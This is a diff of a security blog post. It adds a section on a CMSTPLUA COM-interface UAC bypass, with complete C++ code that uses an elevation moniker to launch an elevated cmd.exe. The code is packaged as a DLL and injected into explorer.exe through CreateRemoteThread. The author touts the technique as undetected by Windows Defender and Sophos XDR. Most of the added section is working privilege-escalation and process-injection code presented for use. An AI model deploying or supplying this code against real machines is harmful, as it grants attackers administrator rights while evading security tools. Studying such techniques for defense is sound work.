@@ -15,13 +15,255 @@ tags:
 ---
 
 It's been almost a year since my last post, and during that time I have acquired a strong interest in revisiting privilege escalation techniques for the modern era 😸
-My goal is always to find code that executes across all Windows versions **AND** bypasses EDR. In fact, when I write these blog posts, I test all the code with EDR on to ensure everything is fully tested before I share my findings.  
+My goal is always to find code that executes across all Windows versions **AND** bypasses at least Windows Defender. In fact, when I write these blog posts, I test all the code against Windows Defender by default to ensure everything is fully tested and can at least bypass defender before I share my findings.  
 
 Unrelated, but I also added an updated [Discord](https://discord.gg/bqDkEdDrQQ) link on the left panel of my site, in case anyone wants to hop in and say hi.  I've met quite a few of you on Twitter over the years and I've thoroughly enjoyed the conversations that have unfolded since I first joined twitter not that long ago.  Okay, let's dive in to the first UAC bypass method.  
 
 > Update: 3/20/2025: I think someone at Microsoft secretly reads this blog... 😆 I say that because all the methods I posted in fall of last year are now deprecated.  The irony is that I was able to resurrect an old UAC Bypass method that still works if you tweak it a bit!  See below for more info:
 
-***UAC Bypass #1 - Revisiting an old technique! (Detection Status: Undetected)***
+***UAC Bypass #1 - Let's travel back to sometime around 8 years...CMSTPLUA COM interface UAC bypass - (Detection Status: Undetected via Windows Defender and Sophos XDR)***
+-
+
+Yes you read that correctly.  This exploit is to my knowledge at least 8 years old and probably even older to be honest.  I can't believe it still works.  This can successfully bypass Windows Defender and Sophos XDR.  I haven't tested any others just yet.   So, how does it work?
+
+**CMSTPLUA** is a **COM class object** identified by CLSID: **{3E5FC7F9-9A51-4367-9063-A120244FBEC7}**
+
+This is an autoelevated COM object and can be found in the registry location below:
+
+**Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\UAC\COMAutoApprovalList**
+
+![image](https://github.com/user-attachments/assets/2c3a00b7-1206-437f-a234-f874d73e51b2)
+
+We will be taking advantage of a COM interface exposed by CMSTPLUA, called ICMLuaUtil.  This interface contains the ShellExec method that allows us to execute our own custom .exe files.  We can access this method and others exposed by the interface after calling **CoCreateInstance** on **CMSTPLUA**.
+
+Using OleView, we can see the COM class object and it's exposed interfaces:
+
+![image](https://github.com/user-attachments/assets/81c0d00e-6f4f-4c6d-a829-88a25d605ecc)
+
+We can also use OleView to see that it is both AutoApproved to bypass UAC and also Elevated:
+
+![image](https://github.com/user-attachments/assets/96addef6-29ab-4ae4-b4e5-e25f82c510d2)
+
+How about the ShellExec function call within the interface?  Yeah, we can see that too if you like 😸  Just fire up Binary Ninja and open `C:\Windows\System32\cmlua.dll`:
+
+![image](https://github.com/user-attachments/assets/1fef1167-3f72-4d68-a9a9-550badd11c01)
+
+Let's bring it all together.  We will be doing the following:
+
+- Call CoCreateInstance(CMSTPLUA CLSID, ..., IID_ICMLuaUtil, ...).
+
+- Receive an ICMLuaUtil* interface pointer.
+
+- Call ICMLuaUtil::ShellExec(...) → results in an elevated process of our choosing
+
+Now time for some code!  We will be using Visual Studio per the usual routine.  We will define our CLASS object CLSID and Interface CLSID as can be seen below.  
+
+```cpp
+
+#include "pch.h"
+#include <shlobj.h>
+#include <atlbase.h>
+#include <shellapi.h> 
+
+#pragma comment(lib, "shell32.lib") 
+
+const wchar_t* CLSID_CMSTPLUA = L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
+const wchar_t* IID_ICMLuaUtil = L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}";
+```
+
+ Next, we need to define the vftable (virtual function table), which is a hidden structure created by the compiler that holds pointers to the virtual functions of a class.  In our case, we are interested in the 7th Function/Method in the list, `ShellExec`.  AddRef() and Release() are considered inherited so we don't have to include them.  So technically we're setting up function/method stubs for SetRasCredentials to ShellExec.  It has to be in order by the way, so you can't just exclude the other methods and just point to ShellExec. 
+
+![image](https://github.com/user-attachments/assets/0aa3b9fe-c6ab-46ba-b367-d2684daf17a2)
+
+
+```cpp
+struct ICMLuaUtil : public IUnknown {
+    virtual HRESULT STDMETHODCALLTYPE Method1() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method2() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method3() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method4() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method5() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method6() = 0;
+    virtual HRESULT STDMETHODCALLTYPE ShellExec(
+        LPCWSTR lpFile,
+        LPCWSTR lpParameters,
+        LPCWSTR lpDirectory,
+        ULONG fMask,
+        ULONG nShow) = 0;
+};
+```
+
+Next, we will declares HRESULT values for error checking and a smart COM pointer to the ICMLuaUtil interface.  Then, we will prepares the moniker string to request elevation through COM:
+
+Moniker String: **"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"** This moniker asks COM to create an elevated instance of the class CMSTPLUA.  We will next do some string to GUID conversions on CLSID and IID.  Then, we need to setup binding options for CoGetObject(), telling it to look for a local server COM object.  Finally, we use `CoGetObject()` with the special elevation moniker to request an elevated COM object implementing ICMLuaUtil.  If successful, it uses the `ShellExec` method of ICMLuaUtil to launch an elevated cmd.exe!
+
+```cpp
+int injector() {
+    HRESULT hr, coi;
+    CComPtr<ICMLuaUtil> spLuaUtil;
+    WCHAR moniker[MAX_PATH] = L"Elevation:Administrator!new:";
+    wcscat_s(moniker, CLSID_CMSTPLUA);
+
+    CLSID clsid;
+    IID iid;
+
+    coi=CoInitialize(NULL);  
+
+    if (FAILED(CLSIDFromString(CLSID_CMSTPLUA, &clsid)) ||
+        FAILED(IIDFromString(IID_ICMLuaUtil, &iid))) {
+        CoUninitialize();
+        return -1;
+    }
+
+    BIND_OPTS3 opts;
+    ZeroMemory(&opts, sizeof(opts));
+    opts.cbStruct = sizeof(opts);
+    opts.dwClassContext = CLSCTX_LOCAL_SERVER;
+
+    hr = CoGetObject(moniker, (BIND_OPTS*)&opts, iid, (void**)&spLuaUtil);
+    if (SUCCEEDED(hr) && spLuaUtil) {
+        spLuaUtil->ShellExec(
+            L"C:\\Windows\\System32\\cmd.exe",
+            nullptr,
+            nullptr,
+            SEE_MASK_DEFAULT,
+            SW_SHOW);
+    }
+
+    CoUninitialize();
+    return 0;
+}
+```
+
+The final code is just boiler plate DLL code that sets up DLLMain and our thread we will be creating to execute the injector() function:
+
+```cpp
+DWORD WINAPI ThreadProc(LPVOID lpParameter) {
+    HMODULE hModule = (HMODULE)lpParameter;
+    injector();
+    FreeLibraryAndExitThread(hModule, 0);
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  ul_reason_for_call,
+    LPVOID lpReserved
+)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        DisableThreadLibraryCalls(hModule);
+        CreateThread(nullptr, 0, ThreadProc, hModule, 0, nullptr);
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+```
+
+But wait...Why are we creating a DLL with our COM bypass code?  Okay, here's the deal.  COM objects are very finnicky and as I understand it, will not run correctly if they are not being executed within a trusted parent/calling process, such as **explorer.exe**
+
+Yeah dude, but that doesn't explain the DLL!  I know...I'm getting there I promise 😸  Most people would opt to do PEB masquerading to make it look as if the executable is running as explorer.exe
+
+I'm not most people, and I like easy solutions. 😆 So, I just inject our DLL into explorer.exe and call it a day.  PEB masquering is hype don't get me wrong!  We can do that next time if you guys like.  For now and for learning purposes, let's just stick with the easy route.  Here's some basic DLL injection code to bring it all together:
+
+```cpp
+#include <windows.h>
+#include <tlhelp32.h>
+#include <iostream>
+
+DWORD GetExplorerPID() {
+    DWORD pid = 0;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) return 0;
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(snapshot, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(snapshot, &pe));
+    }
+
+    CloseHandle(snapshot);
+    return pid;
+}
+
+int main() {
+   
+    DWORD pid = GetExplorerPID();
+    if (!pid) {
+        std::wcerr << L"explorer.exe not found!\n";
+        return 1;
+    }
+
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    if (!hKernel32) return 1;
+
+    
+    auto pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
+    if (!pLoadLibraryW) return 1;
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+        std::wcerr << L"Failed to open explorer.exe\n";
+        return 1;
+    }
+
+    //update this to your path!!!
+    const wchar_t* dllPath = L"C:\\Users\\robbi\\source\\repos\\injected2\\x64\\Debug\\injected2.dll";
+    size_t size = (wcslen(dllPath) + 1) * sizeof(wchar_t);
+
+    LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteMem) {
+        std::wcerr << L"VirtualAllocEx failed\n";
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, size, nullptr)) {
+        std::wcerr << L"WriteProcessMemory failed\n";
+        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    // STEP 5: Create remote thread in explorer.exe
+    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, pLoadLibraryW, remoteMem, 0, nullptr);
+    if (!hThread) {
+        std::wcerr << L"CreateRemoteThread failed\n";
+    }
+    else {
+        std::wcout << L"Injection successful!\n";
+        CloseHandle(hThread);
+    }
+
+    // Clean up
+    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+    return 0;
+}
+```
+
+Compile and run that, and you'll be greeted with your elevated command prompt 🙂
+
+![image](https://github.com/user-attachments/assets/119d2c0c-a294-4cc3-aabd-ad322d4a73e2)
+
+This is an incredibly useful UAC bypass technique and fun to learn too!  It doesn't work on ALWAYS notify UAC setting, but otherwise it should work in all other use cases.
+thanks and now on to the easier UAC bypass methods in the next sections :)
+
+As always, full source code can be found in my github repo:
+
+[Source Code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2024-10-16-Creative%20UAC%20Bypass%20Methods%20for%20the%20Modern%20Era/CSMTP%20COM%20interface%20UAC%20Bypass)
+
+***UAC Bypass #2 - Revisiting an old technique! (Detection Status: Undetected via Windows Defender)***
 -
 
 We're going to be revisiting a tried and true UAC Bypass method that still works just fine as of writing this post, 3/20/2025.  (Microsoft if you're reading this I'm on to you!)  I thought to myself,"Windows Defender can't be blocking all these classic UAC bypass methods."  Sure enough, their filters aren't that impressive.  We're going to be working with the `ComputerDefaults.exe` executable in the `C:\Windows\System32` directory.  Here's how it works:
@@ -112,7 +354,7 @@ Think smarter not harder I guess.  Okay, I feel better about this blog post now.
 
 <iframe width="560" height="315" src="https://www.youtube.com/embed/s4QYZsq32mo?si=IB74bAqzh7zNgIKC" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
 
-***UAC Bypass #2 - Using Micrososft's Troubleshooting Tool to elevate to Admin! (Detection Status: Undetected)***
+***UAC Bypass #3 - Using Micrososft's Troubleshooting Tool to elevate to Admin! (Detection Status: Undetected via Windows Defender)***
 -
 
 Credit first and foremost goes to Emeric Nasi, who discovered this quite some time ago.  All I did was repurpose it for my own needs and present it in a way that is understandable and accessible to you the reader 😸  His original article on this particular UAC bypass technique can be found here: [https://blog.sevagas.com/?MSDT-DLL-Hijack-UAC-bypass](https://blog.sevagas.com/?MSDT-DLL-Hijack-UAC-bypass)
